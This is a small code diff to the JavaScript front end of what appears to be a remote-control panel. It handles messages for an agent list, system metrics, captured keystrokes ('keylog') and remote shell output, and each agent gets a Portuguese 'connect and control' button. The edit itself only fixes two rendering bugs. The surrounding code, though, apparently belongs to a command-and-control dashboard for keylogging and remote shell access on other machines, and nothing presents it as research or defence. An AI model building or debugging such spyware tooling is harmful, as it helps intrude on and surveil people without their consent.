@@ -124,7 +124,7 @@ function send(o){ if(ws?.readyState===WebSocket.OPEN) ws.send(JSON.stringify(o))
 
 function handleMessage(m) {
     switch(m.type) {
-        case 'agent_list': agents = m.agents || []; renderAgents(); break;
+        case 'agent_list': agents = m.agents || []; renderAgents(agents); break;
         case 'metrics': updateMetrics(m); break;
         case 'keylog': addKeylogEntry(m.key, m.down, m.ts); break;
         case 'shell_result': shellOutput.textContent += `\n[RES]: ${m.output}\n`; break;
@@ -233,7 +233,7 @@ function renderAgents(agents) {
                 <button onclick="selectAgent('${agent.id}')">Conectar e Controlar</button>
             </div>
         `;
-        agentsList.appendChild(div);
+        agentsEl.appendChild(div);
     });
 }
 
